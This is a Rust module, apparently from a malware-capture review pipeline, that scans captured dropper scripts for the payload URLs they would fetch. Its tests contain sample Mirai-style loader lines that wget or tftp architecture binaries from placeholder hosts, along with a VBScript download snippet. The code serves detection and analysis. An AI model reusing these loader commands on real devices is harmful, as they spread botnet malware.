//! Embedded payload-URL extraction from a fetched dropper script.
//!
//! A captured HTTP/TFTP payload is often not the final malware binary but a shell dropper
//! (classic Mirai/Gafgyt `bins.sh` style) that fetches the real binaries itself, one per
//! architecture. This module is pure text scanning - no I/O, no shell execution - that pulls the
//! URLs such a script would fetch, so the review pipeline can queue them as follow-up fetches.
//!
//! This is deliberately NOT a shell interpreter. It resolves exactly two constructs real captured
//! loaders use:
//! - simple scalar assignments (`VAR="value"` / `VAR='value'` / `VAR=word`, one per line, last
//!   assignment wins, values may reference any other var in the body - forward or backward -
//!   resolved to a bounded, cycle-safe fixed point, see [`resolve_fixed_point`]);
//! - a single level of `for VAR in WORDS; do` where `WORDS` is either literal whitespace-separated
//!   words or a single `$OTHERVAR` resolved from the assignment map, truncated to `MAX_URLS` words
//!   before any expansion runs.
//!
//! Command substitution (`` $(...) ``, backticks), arithmetic (`$((...))`), parameter expansion
//! (`${VAR:-default}`), and nested loops are out of scope: any URL token that still contains an
//! unresolved `$` after assignment substitution and (at most one) loop expansion is dropped rather
//! than emitted as a broken template. `tftp -g -r <file> <host>` is synthesized into a
//! `tftp://<host>/<file>` URL using the same assignment substitution, but without loop expansion -
//! no captured loader has needed it, and adding it would widen the scope for no observed benefit.
//!
//! Total expansion work is bounded independent of any attacker-controlled repetition: a loop's
//! word list is truncated to `MAX_URLS` before expansion (so one url-token template expands to at
//! most `MAX_URLS` candidates, accepted or rejected), and the whole scan returns immediately once
//! `MAX_URLS` accepted urls have been emitted (so no further template is expanded at all). Without
//! both of these, a crafted body (a huge poisoned word list plus many repeated template lines that
//! never resolve) can drive tens of millions of rejected-candidate iterations in one synchronous
//! call, since a rejected candidate never touches the accepted-url cap.

use std::collections::{HashMap, HashSet};

/// Bodies larger than this are not scanned; a legitimate dropper script is a few KB at most, and
/// this bounds the cost of the scan itself.
const MAX_BODY_LEN: usize = 64 * 1024;

/// Hard cap on emitted URLs. Without this, a `for` loop over a large word list could make the
/// fetcher enqueue an unbounded number of follow-up fetches - a fan-out amplification a malicious
/// script could trigger deliberately. The total-fetch budget is also enforced downstream; this is
/// the source-side guard.
const MAX_URLS: usize = 256;

/// Extract embedded `http://`, `https://`, and synthesized `tftp://` payload URLs from a captured
/// dropper script body. Returns an empty `Vec` if `body` is larger than 64 KB or is not valid
/// UTF-8 text.
pub fn extract_urls(body: &[u8]) -> Vec<String> {
    if body.len() > MAX_BODY_LEN {
        return Vec::new();
    }
    let Ok(text) = std::str::from_utf8(body) else {
        return Vec::new();
    };
    // Script Encoder (.vbe/.jse) is a fixed positional substitution, not encryption. A captured
    // dropper used it to hide a plain `strFileURL = "http://..."` assignment - exactly the shape
    // parsed below - so the follow-up payload was never queued. Decoding first closes that; a body
    // with no envelope passes through unchanged. See `super::vbe`.
    let decoded;
    let text: &str = match super::vbe::decode(text) {
        Some(d) => {
            decoded = d;
            &decoded
        }
        None => text,
    };

    let vars = parse_assignments(text);
    let loops = parse_for_loops(text, &vars);

    let mut urls = Vec::new();
    let mut seen = HashSet::new();

    for raw in scan_url_tokens(text) {
        // Check before doing any expansion work for this token, not just before accepting a
        // result: expand_token's internal loop is the expensive part, so once the cap is hit,
        // no further token should be expanded at all, regardless of how many raw tokens
        // scan_url_tokens found or how many of them are attacker-repeated identical templates.
        if urls.len() >= MAX_URLS {
            return urls;
        }
        for url in expand_token(&raw, &vars, &loops) {
            if urls.len() >= MAX_URLS {
                return urls;
            }
            if seen.insert(url.clone()) {
                urls.push(url);
            }
        }
    }

    for (file, host) in scan_tftp_pairs(text) {
        if urls.len() >= MAX_URLS {
            return urls;
        }
        let file_r = substitute_vars(&file, &vars);
        let host_r = substitute_vars(&host, &vars);
        if file_r.contains('$') || host_r.contains('$') {
            continue;
        }
        let url = format!("tftp://{host_r}/{file_r}");
        if seen.insert(url.clone()) {
            urls.push(url);
        }
    }

    urls
}

/// Bound on fixed-point resolution passes over the assignment map (see [`resolve_fixed_point`]).
/// Generous for any realistic indirection depth in a captured loader, and cheap regardless: each
/// pass is O(total assignment text), which is itself bounded by `MAX_BODY_LEN`.
const MAX_RESOLVE_PASSES: usize = 8;

/// Parse simple `VAR="value"` / `VAR='value'` / `VAR=word` assignments, one per line. Later
/// assignments to the same name overwrite earlier ones (processed top-to-bottom). A value may
/// reference a var assigned EARLIER OR LATER in the body - `resolve_fixed_point` re-resolves the
/// whole map until stable, so a forward reference (`A=$B` before `B` is assigned) still resolves.
fn parse_assignments(text: &str) -> HashMap<String, String> {
    let mut raw: HashMap<String, String> = HashMap::new();
    for line in text.lines() {
        let trimmed = line.trim_start();
        let Some(name_len) = leading_ident_len(trimmed) else {
            continue;
        };
        if name_len == 0 || trimmed.as_bytes().get(name_len) != Some(&b'=') {
            continue;
        }
        let name = &trimmed[..name_len];
        let rest = &trimmed[name_len + 1..];
        raw.insert(name.to_string(), raw_assignment_value(rest).to_string());
    }
    resolve_fixed_point(raw)
}

/// Re-substitute every value against the full map, repeatedly, until nothing changes or
/// `MAX_RESOLVE_PASSES` is reached. Cycle-safe: a self- or mutually-referential chain (`A=$A`,
/// or `A=$B` / `B=$A`) stops changing after at most one pass (each side settles on the other's
/// still-unresolved literal `$NAME` text) and the loop exits via the `!changed` check - it never
/// spins on a cycle, and simply leaves the unresolved `$` in place for the caller to drop.
fn resolve_fixed_point(raw: HashMap<String, String>) -> HashMap<String, String> {
    let mut current = raw;
    for _ in 0..MAX_RESOLVE_PASSES {
        let mut changed = false;
        let mut next = HashMap::with_capacity(current.len());
        for (name, value) in &current {
            let substituted = substitute_vars(value, &current);
            if &substituted != value {
                changed = true;
            }
            next.insert(name.clone(), substituted);
        }
        current = next;
        if !changed {
            break;
        }
    }
    current
}

/// Length in bytes of a leading shell identifier (`[A-Za-z_][A-Za-z0-9_]*`) at the start of `s`,
/// or `None` if `s` does not start with an identifier character.
fn leading_ident_len(s: &str) -> Option<usize> {
    let mut chars = s.char_indices();
    match chars.next() {
        Some((_, c)) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return None,
    }
    let mut end = s.len();
    for (i, c) in chars {
        if !(c.is_ascii_alphanumeric() || c == '_') {
            end = i;
            break;
        }
    }
    Some(end)
}

/// Extract the raw value text after `VAR=` (quote-stripped, or the first unquoted word),
/// unsubstituted - `resolve_fixed_point` handles `$VAR` references afterward, once the whole map
/// is known.
fn raw_assignment_value(rest: &str) -> &str {
    if let Some(stripped) = rest.strip_prefix('"') {
        stripped.find('"').map_or(stripped, |end| &stripped[..end])
    } else if let Some(stripped) = rest.strip_prefix('\'') {
        stripped.find('\'').map_or(stripped, |end| &stripped[..end])
    } else {
        let end = rest
            .find(|c: char| c.is_whitespace() || c == ';' || c == '#')
            .unwrap_or(rest.len());
        &rest[..end]
    }
}

/// Parse `for VAR in WORDS; do` (or `for VAR in WORDS do`, or a `for` line whose `WORDS` runs to
/// end of line with `do` on the next line) into a map of loop variable -> resolved word list.
/// `WORDS` is either literal whitespace-separated words or a single `$OTHERVAR` / `${OTHERVAR}`
/// resolved from `vars`.
fn parse_for_loops(text: &str, vars: &HashMap<String, String>) -> HashMap<String, Vec<String>> {
    let mut loops = HashMap::new();
    for line in text.lines() {
        let trimmed = line.trim();
        let Some(after_for) = trimmed.strip_prefix("for ") else {
            continue;
        };
        let mut tokens = after_for.split_whitespace();
        let Some(loop_var) = tokens.next() else {
            continue;
        };
        if !is_valid_ident(loop_var) {
            continue;
        }
        match tokens.next() {
            Some("in") => {}
            _ => continue,
        }

        let mut words: Vec<String> = Vec::new();
        for tok in tokens {
            if tok == "do" {
                break;
            }
            if let Some(stripped) = tok.strip_suffix(';') {
                if !stripped.is_empty() {
                    words.push(stripped.to_string());
                }
                break;
            }
            words.push(tok.to_string());
        }

        let mut resolved = if words.len() == 1 {
            match single_var_ref(&words[0]) {
                Some(name) => vars
                    .get(&name)
                    .map(|v| v.split_whitespace().map(str::to_string).collect())
                    .unwrap_or_default(),
                None => words,
            }
        } else {
            words
        };
        // Cap the candidate word list before any expansion happens: expand_token iterates
        // every word for every matching url token found in the body, so an uncapped list
        // (e.g. a crafted "ARCHS" with tens of thousands of words) makes that iteration cost
        // attacker-controlled and unbounded by MAX_URLS, since a rejected (still-unresolved)
        // candidate never reaches the accepted-url cap check. Truncating here bounds total
        // expansion work to (url tokens found in the body) x MAX_URLS regardless of how large
        // or how many times a loop's word list is referenced.
        resolved.truncate(MAX_URLS);

        // Intentionally global and last-assignment-wins: if the body reuses the same loop
        // variable name across two different `for` loops, the later loop's word list wins for
        // both. Out of scope to fix - real captured Mirai/Gafgyt loaders use exactly one arch
        // loop.
        loops.insert(loop_var.to_string(), resolved);
    }
    loops
}

/// If `word` is exactly `$NAME` or `${NAME}` (nothing else), return `NAME`.
fn single_var_ref(word: &str) -> Option<String> {
    if let Some(inner) = word.strip_prefix("${") {
        let name = inner.strip_suffix('}')?;
        return is_valid_ident(name).then(|| name.to_string());
    }
    let name = word.strip_prefix('$')?;
    is_valid_ident(name).then(|| name.to_string())
}

fn is_valid_ident(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// A URL token terminates on whitespace, a quote, `;`, `|`, `)`, `>`, or `&`.
fn is_terminator(ch: char) -> bool {
    ch.is_whitespace() || matches!(ch, '\'' | '"' | ';' | '|' | ')' | '>' | '&')
}

/// Scan `text` for raw `http://`/`https://` tokens (unresolved - variable substitution and loop
/// expansion happen in [`expand_token`]).
fn scan_url_tokens(text: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut idx = 0;
    while idx < text.len() {
        let rest = &text[idx..];
        let scheme_len = if rest.starts_with("https://") {
            8
        } else if rest.starts_with("http://") {
            7
        } else {
            0
        };
        if scheme_len > 0 {
            let mut end = idx + scheme_len;
            for (off, ch) in rest[scheme_len..].char_indices() {
                if is_terminator(ch) {
                    break;
                }
                end = idx + scheme_len + off + ch.len_utf8();
            }
            tokens.push(text[idx..end].to_string());
            idx = end;
        } else {
            let ch_len = rest.chars().next().map_or(1, |c| c.len_utf8());
            idx += ch_len;
        }
    }
    tokens
}

/// Scan for `tftp -g -r <file> <host>` invocations (whitespace-tokenized), returning raw
/// `(file, host)` pairs, unresolved.
fn scan_tftp_pairs(text: &str) -> Vec<(String, String)> {
    let tokens: Vec<&str> = text.split_whitespace().collect();
    let mut pairs = Vec::new();
    let mut i = 0;
    while i < tokens.len() {
        if tokens[i] == "tftp"
            && i + 4 < tokens.len()
            && tokens[i + 1] == "-g"
            && tokens[i + 2] == "-r"
        {
            pairs.push((tokens[i + 3].to_string(), tokens[i + 4].to_string()));
            i += 5;
        } else {
            i += 1;
        }
    }
    pairs
}

/// Resolve a raw URL token against assignments, then (if exactly one var remains unresolved and
/// it is a `for`-loop control variable) expand it into one URL per loop word. Returns an empty
/// `Vec` if the token cannot be fully resolved - never emits a URL with a literal `$` left in it.
fn expand_token(
    raw: &str,
    vars: &HashMap<String, String>,
    loops: &HashMap<String, Vec<String>>,
) -> Vec<String> {
    let after_vars = substitute_vars(raw, vars);
    if !after_vars.contains('$') {
        return vec![after_vars];
    }

    let refs = find_var_refs(&after_vars);
    if refs.len() == 1
        && let Some(words) = loops.get(&refs[0])
    {
        let mut out = Vec::new();
        for word in words {
            let mut single = HashMap::new();
            single.insert(refs[0].clone(), word.clone());
            let expanded = substitute_vars(&after_vars, &single);
            if !expanded.contains('$') {
                out.push(expanded);
            }
        }
        return out;
    }

    Vec::new()
}

/// Replace every `$NAME` / `${NAME}` reference found in `vars` with its value. A reference not
/// present in `vars` is left untouched (literal `$NAME` / `${NAME}` in the output) so a later
/// stage can decide whether it is a loop variable or truly unresolved.
fn substitute_vars(input: &str, vars: &HashMap<String, String>) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::with_capacity(input.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] != '$' || i + 1 >= chars.len() {
            out.push(chars[i]);
            i += 1;
            continue;
        }
        if chars[i + 1] == '{' {
            if let Some(end) = find_close_brace(&chars, i + 2) {
                let name: String = chars[i + 2..end].iter().collect();
                match vars.get(&name) {
                    Some(val) => out.push_str(val),
                    None => out.extend(&chars[i..=end]),
                }
                i = end + 1;
                continue;
            }
            out.push('$');
            i += 1;
            continue;
        }
        if chars[i + 1].is_ascii_alphabetic() || chars[i + 1] == '_' {
            let start = i + 1;
            let mut end = start;
            while end < chars.len() && (chars[end].is_ascii_alphanumeric() || chars[end] == '_') {
                end += 1;
            }
            let name: String = chars[start..end].iter().collect();
            match vars.get(&name) {
                Some(val) => out.push_str(val),
                None => out.extend(&chars[i..end]),
            }
            i = end;
            continue;
        }
        out.push('$');
        i += 1;
    }
    out
}

/// Find the byte offset of the `}` closing a `${...}` reference started at `start`, requiring
/// everything in between to be identifier characters (so `${VAR:-default}` - out of scope
/// parameter expansion - correctly returns `None` rather than being mistaken for a plain var).
fn find_close_brace(chars: &[char], start: usize) -> Option<usize> {
    let mut i = start;
    while i < chars.len() {
        if chars[i] == '}' {
            return Some(i);
        }
        if !(chars[i].is_ascii_alphanumeric() || chars[i] == '_') {
            return None;
        }
        i += 1;
    }
    None
}

/// Collect the distinct `$NAME` / `${NAME}` variable names still referenced in `s`, in order of
/// first appearance.
fn find_var_refs(s: &str) -> Vec<String> {
    let chars: Vec<char> = s.chars().collect();
    let mut names = Vec::new();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '$' && i + 1 < chars.len() {
            if chars[i + 1] == '{' {
                if let Some(end) = find_close_brace(&chars, i + 2) {
                    let name: String = chars[i + 2..end].iter().collect();
                    if !names.contains(&name) {
                        names.push(name);
                    }
                    i = end + 1;
                    continue;
                }
            } else if chars[i + 1].is_ascii_alphabetic() || chars[i + 1] == '_' {
                let start = i + 1;
                let mut end = start;
                while end < chars.len() && (chars[end].is_ascii_alphanumeric() || chars[end] == '_')
                {
                    end += 1;
                }
                let name: String = chars[start..end].iter().collect();
                if !names.contains(&name) {
                    names.push(name);
                }
                i = end;
                continue;
            }
        }
        i += 1;
    }
    names
}

#[cfg(test)]
mod tests {
    use super::*;

    // A Script-Encoded dropper hid its payload url from this extractor entirely: the body is
    // scanned as plain text, and encoded text contains no `http://` token. Decoded, it is the
    // ordinary assignment shape the extractor already handles. Documentation address, not the
    // real host the captured sample pointed at.
    #[test]
    fn decodes_a_script_encoded_dropper_before_extracting() {
        let plain = "Set WshShell = CreateObject(\"WScript.Shell\")\r\n\
                     strFileURL = \"http://198.51.100.72/tmp2.exe\"\r\n\
                     objXMLHTTP.open \"GET\", strFileURL, false\r\n";
        let encoded = super::super::vbe::tests::encode(plain);
        // Sanity: the encoded form must not contain the url in the clear, or this test proves
        // nothing about decoding.
        assert!(!encoded.contains("http://"), "fixture leaked the url in the clear");
        assert_eq!(
            extract_urls(encoded.as_bytes()),
            vec!["http://198.51.100.72/tmp2.exe".to_string()]
        );
    }

    #[test]
    fn extracts_arch_urls_from_a_bins_script() {
        let s = b"#!/bin/sh\nwget http://5.6.7.8/mirai.x86 -O a; wget http://5.6.7.8/mirai.arm7\n\
                  busybox tftp -g -r m.mips 5.6.7.8\n";
        let urls = extract_urls(s);
        assert!(urls.contains(&"http://5.6.7.8/mirai.x86".to_string()));
        assert!(urls.contains(&"http://5.6.7.8/mirai.arm7".to_string()));
    }

    #[test]
    fn ignores_binary_and_oversize_bodies() {
        assert!(extract_urls(&[0u8, 159, 146, 150]).is_empty());
        assert!(extract_urls(&vec![b'a'; 70_000]).is_empty());
    }

    #[test]
    fn expands_interpolated_arch_loop_from_a_real_captured_loader() {
        let s = br#"#!/bin/sh
ARCHS="arm arm5 arm7 mips mpsl sh4 m68k ppc ppc440fp spc"
SERVER="198.51.100.72"
for arch in $ARCHS; do
  (wget "http://$SERVER/mirai.$arch" -O- || busybox wget "http://$SERVER/mirai.$arch" -O-) > hDvrHelper
done
"#;
        let urls = extract_urls(s);

        let expected = [
            "arm", "arm5", "arm7", "mips", "mpsl", "sh4", "m68k", "ppc", "ppc440fp", "spc",
        ];
        for arch in expected {
            let want = format!("http://198.51.100.72/mirai.{arch}");
            assert!(urls.contains(&want), "missing {want} in {urls:?}");
        }
        assert_eq!(
            urls.len(),
            expected.len(),
            "unexpected extra urls: {urls:?}"
        );
        assert!(
            urls.iter().all(|u| !u.contains('$')),
            "a template url leaked through: {urls:?}"
        );
    }

    #[test]
    fn substitutes_brace_form_variable() {
        let s = b"SERVER=1.2.3.4\nwget http://${SERVER}/x.bin\n";
        let urls = extract_urls(s);
        assert_eq!(urls, vec!["http://1.2.3.4/x.bin".to_string()]);
    }

    #[test]
    fn drops_url_with_unresolved_variable() {
        let s = b"wget http://$MISSING/x.bin\n";
        let urls = extract_urls(s);
        assert!(urls.is_empty(), "expected no urls, got {urls:?}");
    }

    #[test]
    fn caps_loop_expansion_at_256_and_does_not_hang() {
        let words: Vec<String> = (0..300).map(|i| format!("a{i}")).collect();
        let body = format!(
            "ARCHS=\"{}\"\nfor arch in $ARCHS; do\nwget http://5.6.7.8/x.$arch\ndone\n",
            words.join(" ")
        );
        let urls = extract_urls(body.as_bytes());
        assert_eq!(urls.len(), 256);
        assert!(urls.iter().all(|u| !u.contains('$')));
    }

    /// A crafted adversarial input: a for-loop word list where every word is itself
    /// unresolvable (so every candidate the loop expansion produces is REJECTED, never
    /// touching the accepted-url cap), combined with as many repeated template lines
    /// referencing that loop var as fit under the 64 KB body cap. Before per-loop word-list
    /// truncation, this drove (repeated template count) x (word list length) rejected
    /// expansion iterations - millions, entirely attacker-controlled and independent of
    /// MAX_URLS. See task-7-report.md for the mutation-verified pre-fix timing on this exact
    /// input.
    #[test]
    fn bounds_expansion_work_against_poisoned_repeated_templates() {
        // W (word-list length) and K (repeated template count) are both well past what a real
        // loader needs, chosen so pre-fix work (K x W ~= 2.5M rejected iterations) is clearly
        // unbounded by MAX_URLS while post-fix work (K x min(W, MAX_URLS) ~= 128K) still finishes
        // fast - see task-7-report.md for the mutation-verified timing comparison on this input.
        const W: usize = 5_000;
        const K: usize = 500;
        let poisoned_words: Vec<String> = (0..W).map(|i| format!("$X{i}")).collect();
        let archs_value = poisoned_words.join(" ");
        let mut body = format!("ARCHS=\"{archs_value}\"\nfor arch in $ARCHS; do\n");
        let template_line = "wget http://h/p.$arch\n";
        for _ in 0..K {
            body.push_str(template_line);
        }
        body.push_str("done\n");
        assert!(
            body.len() <= MAX_BODY_LEN,
            "test body must itself respect the 64KB cap: {}",
            body.len()
        );

        let start = std::time::Instant::now();
        let urls = extract_urls(body.as_bytes());
        let elapsed = start.elapsed();

        // Structural bound: never exceeds the cap, and here (every word is genuinely
        // unresolvable, no $Xn is ever assigned) the correct result is empty.
        assert!(
            urls.len() <= 256,
            "must never exceed the cap, got {}",
            urls.len()
        );
        assert!(
            urls.is_empty(),
            "no candidate here is resolvable, got {urls:?}"
        );
        // Not a precise perf gate (the real proof is the mutation-verified timing in the
        // report) - just a generous hang guard, since the fixed version finishes in well
        // under a second on this input.
        assert!(
            elapsed.as_secs() < 5,
            "expansion work must be bounded regardless of the attacker's repetition factor, took {elapsed:?}"
        );
    }

    #[test]
    fn resolves_forward_referenced_variable_chain() {
        // A is assigned before B, referencing it; B is assigned on a LATER line. A single
        // top-to-bottom pass would leave A as the literal "$B" forever.
        let s = b"A=$B\nB=host.example\nwget http://$A/payload.bin\n";
        let urls = extract_urls(s);
        assert_eq!(urls, vec!["http://host.example/payload.bin".to_string()]);
    }

    #[test]
    fn self_referential_assignment_terminates_without_hang() {
        let s = b"A=$A\nwget http://$A/x.bin\n";
        let start = std::time::Instant::now();
        let urls = extract_urls(s);
        let elapsed = start.elapsed();
        assert!(
            urls.is_empty(),
            "a self-reference must not resolve: {urls:?}"
        );
        assert!(
            elapsed.as_secs() < 2,
            "a self-reference must terminate quickly, took {elapsed:?}"
        );
    }
}
